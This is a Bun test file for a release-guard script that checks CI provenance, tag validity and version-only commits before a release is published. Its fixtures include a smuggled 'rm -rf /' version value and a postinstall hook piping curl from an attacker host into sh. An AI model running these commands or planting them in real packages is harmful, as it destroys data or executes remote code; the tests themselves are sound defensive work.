import { afterEach, describe, expect, test } from 'bun:test';
import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// Colocated fixtures for scripts/release-guard.sh (wish
// stable-release-security-gate, F17). CI has no workflow simulator, so the
// ref/tag guard and the run-id provenance validation are exercised here as a
// shell test spawned inside the normal `bun test` gate.

const SCRIPT = join(import.meta.dir, 'release-guard.sh');
const REPO_ROOT = join(import.meta.dir, '..');
const roots: string[] = [];

afterEach(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function mkroot(prefix: string): string {
  const root = mkdtempSync(join(tmpdir(), prefix));
  roots.push(root);
  return root;
}

function guard(subcommand: string, env: Record<string, string>, args: string[] = [], cwd = REPO_ROOT) {
  return Bun.spawnSync(['bash', SCRIPT, subcommand, ...args], {
    cwd,
    env: { PATH: process.env.PATH ?? '', ...env },
    stdout: 'pipe',
    stderr: 'pipe',
  });
}

const VALID_RUN = {
  repository: { full_name: 'automagik-dev/genie' },
  path: '.github/workflows/build-tarballs.yml',
  conclusion: 'success',
  status: 'completed',
  head_branch: 'v5.260714.1',
  head_sha: 'a'.repeat(40),
};

function runJson(root: string, overrides: Record<string, unknown> = {}): string {
  const path = join(root, 'run.json');
  writeFileSync(path, JSON.stringify({ ...VALID_RUN, ...overrides }));
  return path;
}

const PROVENANCE_ENV = {
  EXPECTED_REPO: 'automagik-dev/genie',
  EXPECTED_WORKFLOW: '.github/workflows/build-tarballs.yml',
  EXPECTED_REF: 'refs/tags/v5.260714.1',
  EXPECTED_SHA: 'a'.repeat(40),
  EXPECTED_VERSION: '5.260714.1',
};

describe('require-dispatch-tag (F16 ref guard)', () => {
  test('non-dispatch events are a no-op (tag push / pull_request / workflow_call)', () => {
    for (const event of ['push', 'pull_request', 'workflow_call', '']) {
      const result = guard('require-dispatch-tag', { EVENT: event, REF: 'refs/heads/dev' });
      expect(result.exitCode).toBe(0);
    }
  });

  test('dev-channel dispatch on the freshly-pushed v<version> tag is allowed (HARD INVARIANT)', () => {
    const result = guard('require-dispatch-tag', {
      EVENT: 'workflow_dispatch',
      REF: 'refs/tags/v5.260714.1',
      CHANNEL: 'dev',
      VERSION: '5.260714.1',
    });
    expect(result.exitCode).toBe(0);
  });

  test('stable dispatch on a valid tag is allowed', () => {
    const result = guard('require-dispatch-tag', {
      EVENT: 'workflow_dispatch',
      REF: 'refs/tags/v5.260714.1',
      CHANNEL: 'stable',
    });
    expect(result.exitCode).toBe(0);
  });

  test('a non-tag ref fails closed at a stable-capable dispatch', () => {
    for (const ref of ['refs/heads/dev', 'refs/heads/main', 'refs/heads/attacker', 'refs/pull/1/merge']) {
      const result = guard('require-dispatch-tag', { EVENT: 'workflow_dispatch', REF: ref, CHANNEL: 'stable' });
      expect(result.exitCode).toBe(3);
      expect(result.stderr.toString()).toContain('non-tag ref');
    }
  });

  test('a malformed tag ref fails closed', () => {
    const result = guard('require-dispatch-tag', {
      EVENT: 'workflow_dispatch',
      REF: 'refs/tags/not-a-version',
    });
    expect(result.exitCode).toBe(3);
  });

  test('a version input that does not match the dispatched tag fails closed', () => {
    const result = guard('require-dispatch-tag', {
      EVENT: 'workflow_dispatch',
      REF: 'refs/tags/v5.260714.1',
      VERSION: '5.260714.2',
    });
    expect(result.exitCode).toBe(3);
    expect(result.stderr.toString()).toContain('does not match dispatched tag');
  });

  test('a version input failing the grammar fails closed', () => {
    const result = guard('require-dispatch-tag', {
      EVENT: 'workflow_dispatch',
      REF: 'refs/tags/v5.260714.1',
      VERSION: '5.260714.1; rm -rf /',
    });
    expect(result.exitCode).toBe(3);
  });

  test('suffix-bearing versions fail before release assets or manifests can diverge', () => {
    const result = guard('require-dispatch-tag', {
      EVENT: 'workflow_dispatch',
      REF: 'refs/tags/v5.260714.1-rc.1',
      VERSION: '5.260714.1-rc.1',
      CHANNEL: 'dev',
    });
    expect(result.exitCode).toBe(3);
  });

  test('generic semver, impossible dates, zero counters, and oversized counters are rejected', () => {
    for (const version of ['6.260714.1', '5.261332.1', '5.260229.1', '5.260714.0', '5.260714.10000']) {
      const result = guard('require-dispatch-tag', {
        EVENT: 'workflow_dispatch',
        REF: `refs/tags/v${version}`,
        VERSION: version,
        CHANNEL: 'dev',
      });
      expect(result.exitCode, version).toBe(3);
    }
    expect(
      guard('require-dispatch-tag', {
        EVENT: 'workflow_dispatch',
        REF: 'refs/tags/v5.240229.1',
        VERSION: '5.240229.1',
        CHANNEL: 'dev',
      }).exitCode,
    ).toBe(0);
  });
});

describe('check-run-provenance (F17 upstream identity)', () => {
  test('a matching upstream run record passes', () => {
    const root = mkroot('genie-run-ok-');
    const result = guard('check-run-provenance', PROVENANCE_ENV, [runJson(root)]);
    expect(result.exitCode).toBe(0);
  });

  test('a run from another repository fails closed', () => {
    const root = mkroot('genie-run-repo-');
    const result = guard('check-run-provenance', PROVENANCE_ENV, [
      runJson(root, { repository: { full_name: 'attacker/genie' } }),
    ]);
    expect(result.exitCode).toBe(3);
    expect(result.stderr.toString()).toContain('repository');
  });

  test('a run from a different workflow file fails closed', () => {
    const root = mkroot('genie-run-wf-');
    const result = guard('check-run-provenance', PROVENANCE_ENV, [runJson(root, { path: '.github/workflows/ci.yml' })]);
    expect(result.exitCode).toBe(3);
    expect(result.stderr.toString()).toContain('workflow');
  });

  test('a failed or incomplete upstream run cannot be signed/published', () => {
    const root = mkroot('genie-run-fail-');
    const failed = guard('check-run-provenance', PROVENANCE_ENV, [runJson(root, { conclusion: 'failure' })]);
    expect(failed.exitCode).toBe(3);
    const incomplete = guard('check-run-provenance', PROVENANCE_ENV, [
      runJson(root, { status: 'in_progress', conclusion: null }),
    ]);
    expect(incomplete.exitCode).toBe(3);
  });

  test('a run whose head ref differs from the dispatched tag fails closed', () => {
    const root = mkroot('genie-run-ref-');
    const result = guard('check-run-provenance', PROVENANCE_ENV, [runJson(root, { head_branch: 'dev' })]);
    expect(result.exitCode).toBe(3);
    expect(result.stderr.toString()).toContain('head ref');
  });

  test('a run whose head SHA differs from the dispatched SHA fails closed', () => {
    const root = mkroot('genie-run-sha-');
    const result = guard('check-run-provenance', PROVENANCE_ENV, [runJson(root, { head_sha: 'b'.repeat(40) })]);
    expect(result.exitCode).toBe(3);
    expect(result.stderr.toString()).toContain('head SHA');
  });

  test('a missing provenance file fails closed', () => {
    const result = guard('check-run-provenance', PROVENANCE_ENV, [join(mkroot('genie-run-miss-'), 'absent.json')]);
    expect(result.exitCode).toBe(3);
  });

  test('a non-tag EXPECTED_REF is rejected as misconfiguration', () => {
    const root = mkroot('genie-run-badref-');
    const result = guard('check-run-provenance', { ...PROVENANCE_ENV, EXPECTED_REF: 'refs/heads/dev' }, [
      runJson(root),
    ]);
    expect(result.exitCode).toBe(3);
  });
});

describe('guard-run-provenance (orchestrated vs break-glass)', () => {
  test('an empty run_id is the orchestrated same-run path and is a no-op', () => {
    const result = guard('guard-run-provenance', {
      RUN_ID: '',
      EXPECTED_REPO: 'automagik-dev/genie',
      EXPECTED_WORKFLOW: '.github/workflows/build-tarballs.yml',
      EXPECTED_REF: 'refs/tags/v5.260714.1',
    });
    expect(result.exitCode).toBe(0);
  });

  test('a non-numeric run_id fails closed before any network call', () => {
    const result = guard('guard-run-provenance', {
      RUN_ID: 'not-a-run',
      EXPECTED_REPO: 'automagik-dev/genie',
    });
    expect(result.exitCode).toBe(3);
  });

  test('a numeric run_id fetches via gh and validates the returned record', () => {
    // Fake gh in PATH returns the fixture record for `gh api repos/.../runs/<id>`.
    const root = mkroot('genie-run-gh-');
    const ghPath = join(root, 'gh');
    writeFileSync(
      ghPath,
      `#!/usr/bin/env bun\nimport { writeSync } from 'node:fs';\nconst rec = ${JSON.stringify(
        VALID_RUN,
      )};\nwriteSync(1, JSON.stringify(rec));\nprocess.exit(0);\n`,
    );
    chmodSync(ghPath, 0o755);
    const result = guard('guard-run-provenance', {
      ...PROVENANCE_ENV,
      RUN_ID: '123456',
      PATH: `${root}:${process.env.PATH ?? ''}`,
    });
    expect(result.exitCode).toBe(0);
  });
});

function git(root: string, ...args: string[]): string {
  const result = Bun.spawnSync(['git', ...args], { cwd: root, stdout: 'pipe', stderr: 'pipe' });
  if (result.exitCode !== 0) throw new Error(`git ${args.join(' ')} failed: ${result.stderr.toString()}`);
  return result.stdout.toString().trim();
}

function writeVersionTree(root: string, version: string, packageScript?: string): void {
  const jsonFiles: Array<[string, Record<string, unknown>]> = [
    [
      'package.json',
      { name: '@automagik/genie', version, ...(packageScript ? { scripts: { postinstall: packageScript } } : {}) },
    ],
    ['plugins/genie/.claude-plugin/plugin.json', { name: 'genie', version }],
    ['plugins/genie/.codex-plugin/plugin.json', { name: 'genie', version }],
    ['plugins/genie/package.json', { name: 'genie-plugin', version }],
  ];
  for (const [path, value] of jsonFiles) {
    mkdirSync(join(root, path, '..'), { recursive: true });
    writeFileSync(join(root, path), `${JSON.stringify(value, null, 2)}\n`);
  }
  const marketplace = join(root, '.claude-plugin', 'marketplace.json');
  mkdirSync(join(marketplace, '..'), { recursive: true });
  writeFileSync(marketplace, `${JSON.stringify({ plugins: [{ name: 'genie', version }] }, null, 2)}\n`);
  const hermes = join(root, 'plugins', 'hermes-genie', 'plugin.yaml');
  mkdirSync(join(hermes, '..'), { recursive: true });
  writeFileSync(hermes, `name: genie\nversion: ${version}\ndescription: fixture\n`);
}

function versionRepo(packageScript?: string) {
  const root = mkroot('genie-version-child-');
  git(root, 'init', '-q');
  git(root, 'config', 'user.name', 'fixture');
  git(root, 'config', 'user.email', 'fixture@example.invalid');
  writeVersionTree(root, '5.260714.1');
  git(root, 'add', '.');
  git(root, 'commit', '-qm', 'parent');
  const parent = git(root, 'rev-parse', 'HEAD');
  writeVersionTree(root, '5.260714.2', packageScript);
  git(root, 'add', '.');
  git(root, 'commit', '-qm', 'chore(version): bump to 5.260714.2 [auto-version]');
  return { root, parent, child: git(root, 'rev-parse', 'HEAD') };
}

describe('check-version-child (parent CI inheritance)', () => {
  test('accepts the exact deterministic six-field auto-version child', () => {
    const fixture = versionRepo();
    const result = guard('check-version-child', {}, [fixture.parent, fixture.child, '5.260714.2'], fixture.root);
    expect(result.exitCode).toBe(0);
  });

  test('rejects a package script smuggled inside an otherwise allowlisted version file', () => {
    const fixture = versionRepo('curl https://attacker.invalid | sh');
    const result = guard('check-version-child', {}, [fixture.parent, fixture.child, '5.260714.2'], fixture.root);
    expect(result.exitCode).toBe(3);
    expect(result.stderr.toString()).toContain('not the deterministic version-only child');
  });
});

describe('check-dev-reachability (authoritative dev ancestry)', () => {
  test('accepts the near-tip source in the repository long history without a pipefail false deny', () => {
    const head = git(REPO_ROOT, 'rev-parse', 'HEAD');
    expect(guard('check-dev-reachability', {}, [head, 'HEAD'], REPO_ROOT).exitCode).toBe(0);
  });

  test('rejects a deterministic tag-only child forked from an old dev parent', () => {
    const fixture = versionRepo();
    git(fixture.root, 'checkout', '-qb', 'dev', fixture.parent);
    writeFileSync(join(fixture.root, 'README.md'), 'new authoritative dev work\n');
    git(fixture.root, 'add', 'README.md');
    git(fixture.root, 'commit', '-qm', 'advance dev without fabricated child');

    const rejected = guard('check-dev-reachability', {}, [fixture.child, 'refs/heads/dev'], fixture.root);
    expect(rejected.exitCode).toBe(3);
    expect(rejected.stderr.toString()).toContain('not on the authoritative');

    git(fixture.root, 'checkout', '--detach', '-q');
    git(fixture.root, 'branch', '-f', 'dev', fixture.child);
    git(fixture.root, 'checkout', '-q', 'dev');
    writeFileSync(join(fixture.root, 'README.md'), 'queued later dev work\n');
    git(fixture.root, 'add', 'README.md');
    git(fixture.root, 'commit', '-qm', 'later queued dev commit');
    expect(guard('check-dev-reachability', {}, [fixture.child, 'refs/heads/dev'], fixture.root).exitCode).toBe(0);
  });

  test('rejects a source reachable only through a merge second parent', () => {
    const fixture = versionRepo();
    git(fixture.root, 'checkout', '-qb', 'dev', fixture.parent);
    writeFileSync(join(fixture.root, 'README.md'), 'first-parent dev work\n');
    git(fixture.root, 'add', 'README.md');
    git(fixture.root, 'commit', '-qm', 'advance authoritative dev');
    git(fixture.root, 'merge', '--no-ff', '-qm', 'merge side version child', fixture.child);

    const result = guard('check-dev-reachability', {}, [fixture.child, 'refs/heads/dev'], fixture.root);
    expect(result.exitCode).toBe(3);
    expect(result.stderr.toString()).toContain('first-parent chain');
  });
});

function controlRepo() {
  const root = mkroot('genie-control-descendant-');
  git(root, 'init', '-q');
  git(root, 'config', 'user.name', 'fixture');
  git(root, 'config', 'user.email', 'fixture@example.invalid');
  mkdirSync(join(root, '.github', 'workflows'), { recursive: true });
  writeFileSync(join(root, '.github', 'workflows', 'release.yml'), 'name: trusted release\n');
  writeFileSync(join(root, 'package.json'), '{"name":"fixture"}\n');
  git(root, 'add', '.');
  git(root, 'commit', '-qm', 'ci-approved control');
  const approved = git(root, 'rev-parse', 'HEAD');

  mkdirSync(join(root, '.well-known'), { recursive: true });
  writeFileSync(join(root, '.well-known', 'dev.json'), '{"version":"5.260714.2"}\n');
  git(root, 'add', '.well-known/dev.json');
  git(root, 'commit', '-qm', 'chore(release): update dev manifest');
  return { root, approved, manifest: git(root, 'rev-parse', 'HEAD') };
}

describe('check-control-descendant (manifest-only main continuity)', () => {
  test('accepts a real manifest-only descendant of a CI-approved control commit', () => {
    const fixture = controlRepo();
    const result = guard('check-control-descendant', {}, [fixture.approved, fixture.manifest], fixture.root);
    expect(result.exitCode).toBe(0);
  });

  test('rejects a descendant that changes workflow control outside the generated manifests', () => {
    const fixture = controlRepo();
    writeFileSync(join(fixture.root, '.github', 'workflows', 'release.yml'), 'name: attacker control\n');
    git(fixture.root, 'add', '.github/workflows/release.yml');
    git(fixture.root, 'commit', '-qm', 'change release control');
    const drifted = git(fixture.root, 'rev-parse', 'HEAD');
    const result = guard('check-control-descendant', {}, [fixture.approved, drifted], fixture.root);
    expect(result.exitCode).toBe(3);
    expect(result.stderr.toString()).toContain('not a manifest-only descendant');
  });

  test('rejects unapproved files under .well-known and non-ancestors', () => {
    const fixture = controlRepo();
    writeFileSync(join(fixture.root, '.well-known', 'security.txt'), 'unreviewed identity\n');
    git(fixture.root, 'add', '.well-known/security.txt');
    git(fixture.root, 'commit', '-qm', 'change protected witness');
    const unapproved = git(fixture.root, 'rev-parse', 'HEAD');
    expect(guard('check-control-descendant', {}, [fixture.approved, unapproved], fixture.root).exitCode).toBe(3);
    expect(guard('check-control-descendant', {}, [unapproved, fixture.approved], fixture.root).exitCode).toBe(3);
  });
});

describe('check-manifest-equivalent-trees (promotion and tag equivalence)', () => {
  test('allows generated manifests but rejects unrelated .well-known trust drift', () => {
    const fixture = controlRepo();
    expect(
      guard('check-manifest-equivalent-trees', {}, [fixture.approved, fixture.manifest], fixture.root).exitCode,
    ).toBe(0);

    writeFileSync(join(fixture.root, '.well-known', 'security.txt'), 'changed trust witness\n');
    git(fixture.root, 'add', '.well-known/security.txt');
    git(fixture.root, 'commit', '-qm', 'change trust witness');
    const drifted = git(fixture.root, 'rev-parse', 'HEAD');
    const result = guard('check-manifest-equivalent-trees', {}, [fixture.approved, drifted], fixture.root);
    expect(result.exitCode).toBe(3);
    expect(result.stderr.toString()).toContain('outside the three generated channel manifests');
  });
});

const TRUSTED_CONTROL_SHA = 'c'.repeat(40);
const TRUSTED_PARENT_SHA = 'a'.repeat(40);
const TRUSTED_SOURCE_SHA = 'b'.repeat(40);

function trustedRunFile(root: string, overrides: Record<string, unknown> = {}, name = 'trusted-run.json'): string {
  const path = join(root, name);
  writeFileSync(
    path,
    JSON.stringify({
      repository: { full_name: 'automagik-dev/genie' },
      path: '.github/workflows/ci.yml',
      status: 'completed',
      conclusion: 'success',
      event: 'push',
      head_branch: 'dev',
      head_sha: TRUSTED_PARENT_SHA,
      ...overrides,
    }),
  );
  return path;
}

function controlRunsFile(root: string, include = true): string {
  const path = join(root, 'control-runs.json');
  writeFileSync(
    path,
    JSON.stringify({
      workflow_runs: include
        ? [
            {
              repository: { full_name: 'automagik-dev/genie' },
              path: '.github/workflows/ci.yml',
              status: 'completed',
              conclusion: 'success',
              event: 'push',
              head_branch: 'main',
              head_sha: TRUSTED_CONTROL_SHA,
            },
          ]
        : [],
    }),
  );
  return path;
}

const TRUSTED_ENV = {
  EVENT: 'workflow_run',
  CONTROL_REF: 'refs/heads/main',
  CONTROL_SHA: TRUSTED_CONTROL_SHA,
  CALLER_WORKFLOW_REF: 'automagik-dev/genie/.github/workflows/version.yml@refs/heads/main',
  CALLER_WORKFLOW_SHA: TRUSTED_CONTROL_SHA,
  DISPATCH_ACTOR: 'release-maintainer-a',
  TRIGGERING_ACTOR: 'release-maintainer-a',
  RUN_ATTEMPT: '1',
  VERSION: '5.260714.2',
  CHANNEL: 'dev',
  SOURCE_SHA: TRUSTED_SOURCE_SHA,
  SOURCE_BRANCH: 'dev',
  SOURCE_CI_RUN_ID: '123456',
  EXPECTED_REPO: 'automagik-dev/genie',
  EXPECTED_WORKFLOW: '.github/workflows/ci.yml',
  ACTUAL_TAG_SHA: TRUSTED_SOURCE_SHA,
  VERSION_PARENT_SHA: TRUSTED_PARENT_SHA,
  VERSION_ONLY_MATCH: 'true',
  DEV_REF_REACHABLE: 'true',
};

const STABLE_TRUSTED_ENV = {
  ...TRUSTED_ENV,
  EVENT: 'workflow_dispatch',
  CALLER_WORKFLOW_REF: 'automagik-dev/genie/.github/workflows/release.yml@refs/heads/main',
  CHANNEL: 'stable',
  SOURCE_BRANCH: 'main',
  TAG_TREE_MATCH: 'true',
};

describe('check-trusted-release (main control + source provenance)', () => {
  test('accepts a main-controlled dev release whose tag is a deterministic child of successful parent CI', () => {
    const root = mkroot('genie-trusted-dev-');
    const result = guard('check-trusted-release', TRUSTED_ENV, [trustedRunFile(root), controlRunsFile(root)]);
    expect(result.exitCode).toBe(0);
  });

  test('accepts a control head only through an explicitly proven manifest-only CI ancestor', () => {
    const root = mkroot('genie-trusted-manifest-control-');
    const manifestHead = 'd'.repeat(40);
    const result = guard(
      'check-trusted-release',
      {
        ...TRUSTED_ENV,
        CONTROL_SHA: manifestHead,
        CALLER_WORKFLOW_SHA: manifestHead,
        CONTROL_CI_SHA: TRUSTED_CONTROL_SHA,
        CONTROL_MANIFEST_ONLY_MATCH: 'true',
      },
      [trustedRunFile(root), controlRunsFile(root)],
    );
    expect(result.exitCode).toBe(0);

    const unproven = guard(
      'check-trusted-release',
      {
        ...TRUSTED_ENV,
        CONTROL_SHA: manifestHead,
        CALLER_WORKFLOW_SHA: manifestHead,
        CONTROL_CI_SHA: TRUSTED_CONTROL_SHA,
        CONTROL_MANIFEST_ONLY_MATCH: 'false',
      },
      [trustedRunFile(root), controlRunsFile(root)],
    );
    expect(unproven.exitCode).toBe(3);
  });

  test('accepts stable only from successful main push CI with an equivalent tag tree', () => {
    const root = mkroot('genie-trusted-stable-');
    const source = trustedRunFile(root, {
      head_branch: 'main',
      head_sha: TRUSTED_SOURCE_SHA,
    });
    const result = guard('check-trusted-release', STABLE_TRUSTED_ENV, [source, controlRunsFile(root)]);
    expect(result.exitCode).toBe(0);
  });

  test('stable requires a fresh human dispatch so environment approval excludes its initiator', () => {
    const root = mkroot('genie-trusted-stable-actor-');
    const source = trustedRunFile(root, {
      head_branch: 'main',
      head_sha: TRUSTED_SOURCE_SHA,
    });
    const args = [source, controlRunsFile(root)];
    const stable = STABLE_TRUSTED_ENV;

    for (const env of [
      { ...stable, DISPATCH_ACTOR: 'github-actions[bot]', TRIGGERING_ACTOR: 'github-actions[bot]' },
      { ...stable, DISPATCH_ACTOR: 'release-maintainer-a', TRIGGERING_ACTOR: 'release-maintainer-b' },
      { ...stable, RUN_ATTEMPT: '2' },
      { ...stable, DISPATCH_ACTOR: '', TRIGGERING_ACTOR: '' },
    ]) {
      expect(guard('check-trusted-release', env, args).exitCode).toBe(3);
    }
  });

  test('rejects non-main control, tag mismatch, and a non-deterministic version child', () => {
    const root = mkroot('genie-trusted-reject-');
    const args = [trustedRunFile(root), controlRunsFile(root)];
    for (const env of [
      { ...TRUSTED_ENV, CONTROL_REF: 'refs/tags/v5.260714.2' },
      { ...TRUSTED_ENV, ACTUAL_TAG_SHA: 'd'.repeat(40) },
      { ...TRUSTED_ENV, VERSION_ONLY_MATCH: 'false' },
      { ...TRUSTED_ENV, EVENT: 'workflow_dispatch' },
      {
        ...TRUSTED_ENV,
        CALLER_WORKFLOW_REF: 'automagik-dev/genie/.github/workflows/attacker.yml@refs/heads/main',
      },
    ]) {
      expect(guard('check-trusted-release', env, args).exitCode).toBe(3);
    }
  });

  test('rejects failed source CI, stable tree drift, and missing successful control CI', () => {
    const root = mkroot('genie-trusted-fail-');
    const failedSource = trustedRunFile(root, { conclusion: 'failure' }, 'failed-source.json');
    expect(guard('check-trusted-release', TRUSTED_ENV, [failedSource, controlRunsFile(root)]).exitCode).toBe(3);

    const stableSource = trustedRunFile(
      root,
      { head_branch: 'main', head_sha: TRUSTED_SOURCE_SHA },
      'stable-source.json',
    );
    expect(
      guard('check-trusted-release', { ...STABLE_TRUSTED_ENV, TAG_TREE_MATCH: 'false' }, [
        stableSource,
        controlRunsFile(root),
      ]).exitCode,
    ).toBe(3);
    expect(
      guard('check-trusted-release', TRUSTED_ENV, [trustedRunFile(root), controlRunsFile(root, false)]).exitCode,
    ).toBe(3);
  });
});
